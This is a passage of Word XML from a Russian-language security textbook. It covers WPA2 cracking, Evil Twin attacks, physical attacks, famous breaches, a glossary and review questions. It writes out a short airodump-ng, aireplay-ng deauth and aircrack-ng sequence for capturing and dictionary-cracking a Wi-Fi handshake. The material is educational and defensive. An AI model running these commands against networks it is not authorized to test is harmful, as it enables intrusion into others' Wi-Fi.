    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>WPA2 использует **4-way handshake** для аутентификации</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Хакер перехватывает handshake → брутфорсит пароль офлайн</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Процесс взлома:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t># 1. Перехватить handshake</w:t>
        <w:br/>
        <w:t>airodump-ng --bssid AA:BB:CC:DD:EE:FF --channel 6 -w capture wlan0mon</w:t>
        <w:br/>
        <w:br/>
        <w:t># 2. Деаутентифицировать клиента (чтобы он переподключился и handshake повторился)</w:t>
        <w:br/>
        <w:t>aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon</w:t>
        <w:br/>
        <w:br/>
        <w:t># 3. Взломать пароль (brute force с wordlist)</w:t>
        <w:br/>
        <w:t>aircrack-ng -w passwords.txt capture-01.cap</w:t>
        <w:br/>
        <w:t># Если пароль "password123" в словаре → взломан</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Сложность:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Если пароль сложный (`Kj8$mQ#2vL9p`) и не в словаре → взлом займёт годы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Если пароль простой (`12345678`) → взлом за минуты</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Защита:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Длинный пароль Wi-Fi** (минимум 16 символов)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**WPA3** (защищён от offline brute force)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Evil Twin (Злой двойник)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Определение</w:t>
      </w:r>
      <w:r>
        <w:t>: Создание фальшивой точки доступа с таким же именем, как у легитимной.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как работает:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Настоящая сеть: `Starbucks_WiFi` (пароля нет)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Хакер создаёт точку: `Starbucks_WiFi` (с более сильным сигналом)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Жертвы автоматически подключаются к хакеру</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Хакер перенаправляет трафик через себя (MITM) → перехватывает логины/пароли</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Инструмент — WiFi Pineapple</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Девайс для тестирования безопасности Wi-Fi</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Автоматически создаёт Evil Twin и перехватывает трафик</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Защита:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Не подключайся к открытым Wi-Fi** без VPN</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Проверяй имя сети (если видишь две `Starbucks_WiFi` — подозрительно)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Используй VPN всегда в публичных сетях</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9.5.7. Физический доступ: Когда хакер — это уборщица</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>USB Drop Attack (Подбрасывание USB)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Определение</w:t>
      </w:r>
      <w:r>
        <w:t>: Оставление заражённых USB-флешек в местах, где их могут подобрать.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Реальный эксперимент — University of Illinois (2016)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Исследователи разбросали **297 USB-флешек** по кампусу</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**48%** флешек подняли и вставили в компьютер</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Если бы флешки были заражены → 48% компьютеров скомпрометированы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Защита:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Не вставляй чужие USB**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Отключи автозапуск: `Панель управления → Автозапуск → Снять все галочки`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Shoulder Surfing (Подглядывание через плечо)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Определение</w:t>
      </w:r>
      <w:r>
        <w:t>: Наблюдение за экраном или клавиатурой жертвы.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Где используется:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>В кафе (подсмотреть пароль)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>В аэропорту (PIN-код карты)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>В банкомате (прикрыть клавиатуру рукой!)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Защита:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Privacy screen** (плёнка на экран, ограничивающая угол обзора)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Не вводи пароли в публичных местах</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Прикрывай клавиатуру рукой при вводе PIN</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Кража устройств</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример — ноутбук без шифрования:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Украли ноутбук из машины</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Вытащили жёсткий диск</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Подключили к другому компьютеру</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Прочитали все файлы (документы, пароли из браузера)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Защита:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Шифрование диска** (BitLocker, LUKS, FileVault) — глава 9.04</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Удалённое стирание** (Find My Device)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9.5.8. Реальные кейсы: Когда всё пошло не так</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Target (2013) — 40 миллионов карт украдено через HVAC</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что произошло:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Хакеры взломали **подрядчика** (компанию, обслуживающую кондиционеры Target)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Получили учётные данные для VPN Target</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Проникли в сеть Target → установили вредоносное ПО на кассовые терминалы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Украдено **40 млн номеров кредитных карт** и **70 млн личных данных**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ущерб:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>$162 млн компенсаций</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Увольнение CEO</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Репутационные потери</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Урок:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Защищай </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>цепочку поставок</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (подрядчики = слабое звено).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Sony Pictures (2014) — Месть за фильм</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что произошло:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Группа **Guardians of Peace** (предположительно Северная Корея) взломала Sony</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Причина: фильм «The Interview» (комедия про убийство Ким Чен Ына)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Украдено: email топ-менеджеров, нереализованные фильмы, зарплаты актёров, данные сотрудников</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ущерб:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>$15 млн на восстановление</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Публичный позор (утечка неполиткорректных email)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Урок:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Политические хакеры существуют (не только финансовая мотивация).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>SolarWinds (2020) — Атака на цепочку поставок</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что произошло:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Хакеры (предположительно российская группа **APT29 / Cozy Bear**) взломали компанию **SolarWinds** (разработчик ПО для мониторинга IT-инфраструктуры)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Внедрили бэкдор в обновление программы **Orion**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>18,000 организаций установили заражённое обновление</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Скомпрометированы: Microsoft, FireEye, министерства США</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ущерб:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Неизвестен (государственная тайна)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Считается одной из самых сложных кибератак в истории</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Урок:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Даже обновления ПО могут быть заражены (проверяй цифровые подписи).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9.5.9. Ключевые термины</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Социальная инженерия** — манипуляция людьми для выманивания информации</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Фишинг** — поддельные письма/сайты для кражи учётных данных</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Spear Phishing** — целевой фишинг на конкретного человека</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Whaling** — фишинг на топ-менеджеров</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Pretexting** — создание ложного сценария для обмана жертвы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Baiting** — атака, основанная на любопытстве (USB drop, fake Wi-Fi)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Quid Pro Quo** — обещание выгоды в обмен на информацию</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Brute Force** — перебор всех возможных паролей</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Dictionary Attack** — перебор популярных паролей из словаря</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Rainbow Table** — предвычисленные хеши паролей</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Credential Stuffing** — использование украденных паролей с одного сайта на других</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**MITM (Man-in-the-Middle)** — перехват трафика между клиентом и сервером</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Packet Sniffing** — прослушивание трафика в сети</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**IP Spoofing** — подделка IP-адреса отправителя</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**DDoS** — атака отказа в обслуживании (перегрузка сервера)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**DNS Spoofing** — подмена DNS-записи (перенаправление на фальшивый сайт)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**SQL Injection** — внедрение вредоносного SQL-кода</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**XSS (Cross-Site Scripting)** — внедрение JavaScript на сайт</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**CSRF** — подделка запросов от имени жертвы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**RCE (Remote Code Execution)** — удалённое выполнение кода на сервере</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Вирус** — программа, копирующая себя в другие файлы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Червь** — самораспространяющаяся программа</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Троян** — вредоносная программа, маскирующаяся под легитимную</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Ransomware** — вирус, шифрующий файлы и требующий выкуп</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Spyware** — шпионское ПО</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Rootkit** — ПО, скрывающее своё присутствие в системе</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Evil Twin** — фальшивая точка доступа Wi-Fi</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Shoulder Surfing** — подглядывание за экраном/клавиатурой</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9.5.10. Контрольные вопросы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Теория</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Чем отличается фишинг от spear phishing?**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Фишинг — массовая рассылка, spear phishing — целевая атака на конкретного человека с персонализированным контентом.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Почему rainbow table бесполезна, если пароли хранятся с солью?**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Соль — случайная строка, добавляемая к паролю перед хешированием. Даже одинаковые пароли имеют разные хеши → для каждого пользователя нужна своя rainbow table.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Как работает MITM-атака в публичном Wi-Fi?**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Хакер выполняет ARP spoofing (обманывает роутер, что его MAC-адрес = адрес роутера) → весь трафик идёт через хакера → он может подслушивать и модифицировать данные.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Чем SQL-инъекция опасна и как защититься?**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Позволяет выполнить произвольный SQL-код (украсть данные, удалить таблицы). Защита: prepared statements, ORM, валидация ввода.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Почему ransomware так эффективен?**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Шифрует файлы AES-256 (невозможно расшифровать без ключа), создаёт срочность (72 часа), требует выкуп в биткоинах (анонимность).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Что такое Evil Twin и как защититься?**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Фальшивая точка доступа с именем легитимной сети. Защита: VPN в публичных Wi-Fi, проверка сертификатов HTTPS, отключение автоподключения к Wi-Fi.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Почему WEP устарел?**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Использует слабое шифрование RC4, взламывается за 5 минут с помощью aircrack-ng. Нужно использовать WPA2/WPA3.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Чем вирус отличается от червя?**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Вирус заражает файлы (нужен носитель), червь — самостоятельно распространяется по сети.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Что такое rootkit и почему его сложно обнаружить?**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Вредоносное ПО, скрывающее своё присутствие (заменяет системные утилиты). Kernel-mode rootkit работает на уровне ядра → антивирусы не видят.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Как работает credential stuffing?**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
